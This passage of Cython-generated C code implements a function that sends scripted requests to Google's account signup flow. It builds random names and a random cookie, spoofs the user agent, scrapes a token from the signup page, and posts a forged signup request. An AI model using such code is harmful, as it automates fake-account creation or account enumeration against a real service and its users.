(__Pyx_PyErr_Occurred()) {\n    __Pyx_Generator_Replace_StopIteration(0);\n    __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  }\n  __pyx_L0:;\n  __Pyx_XGIVEREF(__pyx_r);\n  #if !CYTHON_USE_EXC_INFO_STACK\n  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);\n  #endif\n  __pyx_generator->resume_label = -1;\n  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\n\nstatic PyObject *__pyx_pf_2op_2tll(CYTHON_UNUSED PyObject *__pyx_self) {\n  PyObject *__pyx_v_n1 = NULL;\n  PyObject *__pyx_v_n2 = NULL;\n  PyObject *__pyx_v_host = NULL;\n  PyObject *__pyx_v_he3 = NULL;\n  PyObject *__pyx_v_res1 = NULL;\n  PyObject *__pyx_v_tok = NULL;\n  PyObject *__pyx_v_cookies = NULL;\n  PyObject *__pyx_v_headers = NULL;\n  PyObject *__pyx_v_data = NULL;\n  PyObject *__pyx_v_response = NULL;\n  PyObject *__pyx_v_tl = NULL;\n  PyObject *__pyx_v_f = NULL;\n  PyObject *__pyx_v_e = NULL;\n  PyObject *__pyx_gb_2op_3tll_2generator = 0;\n  PyObject *__pyx_gb_2op_3tll_5generator1 = 0;\n  PyObject *__pyx_gb_2op_3tll_8generator2 = 0;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  PyObject *__pyx_t_8 = NULL;\n  size_t __pyx_t_9;\n  PyObject *__pyx_t_10 = NULL;\n  PyObject *__pyx_t_11[11];\n  PyObject *__pyx_t_12 = NULL;\n  PyObject *__pyx_t_13 = NULL;\n  PyObject *__pyx_t_14 = NULL;\n  PyObject *__pyx_t_15 = NULL;\n  PyObject *__pyx_t_16 = NULL;\n  PyObject *__pyx_t_17[4];\n  PyObject *__pyx_t_18 = NULL;\n  int __pyx_t_19;\n  int __pyx_t_20;\n  int __pyx_t_21;\n  int __pyx_t_22;\n  char const *__pyx_t_23;\n  PyObject *__pyx_t_24 = NULL;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("tll", 0);\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_2);\n    __Pyx_XGOTREF(__pyx_t_3);\n     {\n\n      \n      __pyx_t_5 = NULL;\n      __Pyx_INCREF(__pyx_builtin_range);\n      __pyx_t_6 = __pyx_builtin_range; \n      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_rr); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 113, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_mstate_global->__pyx_tuple[1], NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 113, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __pyx_t_9 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_8};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 113, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __pyx_t_6 = __pyx_pf_2op_3tll_genexpr(NULL, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 113, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __pyx_t_4 = __Pyx_Generator_GetInlinedResult(__pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 113, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __pyx_t_6 = PyUnicode_Join(__pyx_mstate_global->__pyx_kp_u__2, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 113, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __pyx_v_n1 = ((PyObject*)__pyx_t_6);\n      __pyx_t_6 = 0;\n\n      \n      __pyx_t_4 = NULL;\n      __Pyx_INCREF(__pyx_builtin_range);\n      __pyx_t_8 = __pyx_builtin_range; \n      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_rr); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 114, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_mstate_global->__pyx_tuple[2], NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 114, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_9 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_7};\n        __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_8, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 114, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_6);\n      }\n      __pyx_t_8 = __pyx_pf_2op_3tll_3genexpr(NULL, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 114, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __pyx_t_6 = __Pyx_Generator_GetInlinedResult(__pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 114, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      __pyx_t_8 = PyUnicode_Join(__pyx_mstate_global->__pyx_kp_u__2, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 114, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __pyx_v_n2 = ((PyObject*)__pyx_t_8);\n      __pyx_t_8 = 0;\n\n      \n      __pyx_t_6 = NULL;\n      __Pyx_INCREF(__pyx_builtin_range);\n      __pyx_t_7 = __pyx_builtin_range; \n      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 115, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_mstate_global->__pyx_tuple[3], NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 115, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __pyx_t_9 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_t_5};\n        __pyx_t_8 = __Pyx_PyObject_FastCall(__pyx_t_7, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 115, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_8);\n      }\n      __pyx_t_7 = __pyx_pf_2op_3tll_6genexpr(NULL, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 115, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      __pyx_t_8 = __Pyx_Generator_GetInlinedResult(__pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 115, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __pyx_t_7 = PyUnicode_Join(__pyx_mstate_global->__pyx_kp_u__2, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 115, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      __pyx_v_host = __pyx_t_7;\n      __pyx_t_7 = 0;\n\n      \n      __pyx_t_7 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 117, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_accept, __pyx_mstate_global->__pyx_kp_u__3) < (0)) __PYX_ERR(0, 117, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_accept_language, __pyx_mstate_global->__pyx_kp_u_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q) < (0)) __PYX_ERR(0, 117, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_content_type, __pyx_mstate_global->__pyx_kp_u_application_x_www_form_urlencode) < (0)) __PYX_ERR(0, 117, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_google_accounts_xsrf, __pyx_mstate_global->__pyx_kp_u_1) < (0)) __PYX_ERR(0, 117, __pyx_L3_error)\n\n      \n      __pyx_t_5 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_ggb); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 121, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __pyx_t_9 = 1;\n      #if CYTHON_UNPACK_METHODS\n      if (unlikely(PyMethod_Check(__pyx_t_6))) {\n        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);\n        assert(__pyx_t_5);\n        PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_6);\n        __Pyx_INCREF(__pyx_t_5);\n        __Pyx_INCREF(__pyx__function);\n        __Pyx_DECREF_SET(__pyx_t_6, __pyx__function);\n        __pyx_t_9 = 0;\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};\n        __pyx_t_8 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+__pyx_t_9, (1-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 121, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_8);\n      }\n      __pyx_t_6 = __Pyx_PyObject_Unicode(__pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 121, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_user_agent, __pyx_t_6) < (0)) __PYX_ERR(0, 117, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __pyx_v_he3 = ((PyObject*)__pyx_t_7);\n      __pyx_t_7 = 0;\n\n      \n      __pyx_t_6 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_mstate_global->__pyx_n_u_requests); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 123, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_mstate_global->__pyx_n_u_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 123, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n\n      \n      __pyx_t_9 = 1;\n      #if CYTHON_UNPACK_METHODS\n      if (unlikely(PyMethod_Check(__pyx_t_5))) {\n        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);\n        assert(__pyx_t_6);\n        PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_5);\n        __Pyx_INCREF(__pyx_t_6);\n        __Pyx_INCREF(__pyx__function);\n        __Pyx_DECREF_SET(__pyx_t_5, __pyx__function);\n        __pyx_t_9 = 0;\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2 + ((CYTHON_VECTORCALL) ? 1 : 0)] = {__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_https_accounts_google_com_signin};\n        __pyx_t_8 = __Pyx_MakeVectorcallBuilderKwds(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 123, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_8);\n        if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_headers, __pyx_v_he3, __pyx_t_8, __pyx_callargs+2, 0) < (0)) __PYX_ERR(0, 123, __pyx_L3_error)\n        __pyx_t_7 = __Pyx_Object_Vectorcall_CallFromBuilder(__pyx_t_5, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET), __pyx_t_8);\n        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 123, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_7);\n      }\n      __pyx_v_res1 = __pyx_t_7;\n      __pyx_t_7 = 0;\n\n      \n      __pyx_t_6 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_re); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 127, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_search); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 127, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n\n      \n      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_res1, __pyx_mstate_global->__pyx_n_u_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 128, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __pyx_t_9 = 1;\n      #if CYTHON_UNPACK_METHODS\n      if (unlikely(PyMethod_Check(__pyx_t_10))) {\n        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_10);\n        assert(__pyx_t_6);\n        PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_10);\n        __Pyx_INCREF(__pyx_t_6);\n        __Pyx_INCREF(__pyx__function);\n        __Pyx_DECREF_SET(__pyx_t_10, __pyx__function);\n        __pyx_t_9 = 0;\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[3] = {__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_data_initial_setup_data_null_nul, __pyx_t_4};\n        __pyx_t_8 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_9, (3-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 127, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_8);\n      }\n      __pyx_t_5 = __pyx_t_8;\n      __Pyx_INCREF(__pyx_t_5);\n      __pyx_t_9 = 0;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_mstate_global->__pyx_int_2};\n        __pyx_t_7 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_group, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 128, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_7);\n      }\n      __pyx_v_tok = __pyx_t_7;\n      __pyx_t_7 = 0;\n\n      \n      __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 130, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_Host_GAPS, __pyx_v_host) < (0)) __PYX_ERR(0, 130, __pyx_L3_error)\n      __pyx_v_cookies = ((PyObject*)__pyx_t_7);\n      __pyx_t_7 = 0;\n\n      \n      __pyx_t_7 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 133, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_authority, __pyx_mstate_global->__pyx_kp_u_accounts_google_com) < (0)) __PYX_ERR(0, 133, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_accept, __pyx_mstate_global->__pyx_kp_u__3) < (0)) __PYX_ERR(0, 133, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_accept_language, __pyx_mstate_global->__pyx_kp_u_en_US_en_q_0_9) < (0)) __PYX_ERR(0, 133, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_content_type, __pyx_mstate_global->__pyx_kp_u_application_x_www_form_urlencode) < (0)) __PYX_ERR(0, 133, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_google_accounts_xsrf, __pyx_mstate_global->__pyx_kp_u_1) < (0)) __PYX_ERR(0, 133, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_origin, __pyx_mstate_global->__pyx_kp_u_https_accounts_google_com) < (0)) __PYX_ERR(0, 133, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_referer, __pyx_mstate_global->__pyx_kp_u_https_accounts_google_com_signup) < (0)) __PYX_ERR(0, 133, __pyx_L3_error)\n\n      \n      __pyx_t_5 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_ggb); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 140, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __pyx_t_9 = 1;\n      #if CYTHON_UNPACK_METHODS\n      if (unlikely(PyMethod_Check(__pyx_t_10))) {\n        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_10);\n        assert(__pyx_t_5);\n        PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_10);\n        __Pyx_INCREF(__pyx_t_5);\n        __Pyx_INCREF(__pyx__function);\n        __Pyx_DECREF_SET(__pyx_t_10, __pyx__function);\n        __pyx_t_9 = 0;\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};\n        __pyx_t_8 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_9, (1-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 140, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_8);\n      }\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_user_agent, __pyx_t_8) < (0)) __PYX_ERR(0, 133, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      __pyx_v_headers = ((PyObject*)__pyx_t_7);\n      __pyx_t_7 = 0;\n\n      \n      __pyx_t_7 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 143, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_tok, __pyx_mstate_global->__pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 143, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __pyx_t_10 = __Pyx_PyUnicode_Unicode(__pyx_v_n1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 143, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __pyx_t_5 = __Pyx_PyUnicode_Unicode(__pyx_v_n2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 143, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_4 = __Pyx_PyUnicode_Unicode(__pyx_v_n1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 143, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __pyx_t_6 = __Pyx_PyUnicode_Unicode(__pyx_v_n2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 143, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __pyx_t_11[0] = __pyx_mstate_global->__pyx_kp_u__4;\n      __pyx_t_11[1] = __pyx_t_8;\n      __pyx_t_11[2] = __pyx_mstate_global->__pyx_kp_u__5;\n      __pyx_t_11[3] = __pyx_t_10;\n      __pyx_t_11[4] = __pyx_mstate_global->__pyx_kp_u__5;\n      __pyx_t_11[5] = __pyx_t_5;\n      __pyx_t_11[6] = __pyx_mstate_global->__pyx_kp_u__5;\n      __pyx_t_11[7] = __pyx_t_4;\n      __pyx_t_11[8] = __pyx_mstate_global->__pyx_kp_u__5;\n      __pyx_t_11[9] = __pyx_t_6;\n      __pyx_t_11[10] = __pyx_mstate_global->__pyx_kp_u_0_0_null_null_web_glif_signup_0;\n      __pyx_t_12 = __Pyx_PyUnicode_Join(__pyx_t_11, 11, 2 + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8) + 3 * 4 + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10) + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5) + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4) + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6) + 48, 127 | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6));\n      if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 143, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_12);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_f_req, __pyx_t_12) < (0)) __PYX_ERR(0, 143, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;\n      if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_deviceinfo, __pyx_mstate_global->__pyx_kp_u_null_null_null_null_null_NL_nul) < (0)) __PYX_ERR(0, 143, __pyx_L3_error)\n      __pyx_v_data = ((PyObject*)__pyx_t_7);\n      __pyx_t_7 = 0;\n\n      \n      __pyx_t_12 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_requests); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 146, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 146, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n\n      \n      __pyx_t_9 = 1;\n      #if CYTHON_UNPACK_METHODS\n      if (unlikely(PyMethod_Check(__pyx_t_4))) {\n        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_4);\n        assert(__pyx_t_12);\n        PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_4);\n        __Pyx_INCREF(__pyx_t_12);\n        __Pyx_INCREF(__pyx__function);\n        __Pyx_DECREF_SET(__pyx_t_4, __pyx__function);\n        __pyx_t_9 = 0;\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2 + ((CYTHON_VECTORCALL) ? 3 : 0)] = {__pyx_t_12, __pyx_mstate_global->__pyx_kp_u_https_accounts_google_com___sign};\n        __pyx_t_6 = __Pyx_MakeVectorcallBuilderKwds(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 146, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_6);\n        if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_cookies, __pyx_v_cookies, __pyx_t_6, __pyx_callargs+2, 0) < (0)) __PYX_ERR(0, 146, __pyx_L3_error)\n        if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_headers, __pyx_v_headers, __pyx_t_6, __pyx_callargs+2, 1) < (0)) __PYX_ERR(0, 146, __pyx_L3_error)\n        if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_data, __pyx_v_data, __pyx_t_6, __pyx_callargs+2, 2) < (0)) __PYX_ERR(0, 146, __pyx_L3_error)\n        __pyx_t_7 = __Pyx_Object_Vectorcall_CallFromBuilder(__pyx_t_4, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET), __pyx_t_6);\n        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 146, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_7);\n      }\n      __pyx_v_response = __pyx_t_7;\n      __pyx_t_7 = 0;\n\n      \n      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_mstate_global->__pyx_n_u_text); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 152, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __pyx_t_12 = __Pyx_PyObject_Unicode(__pyx_t_6); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 152, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_12);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      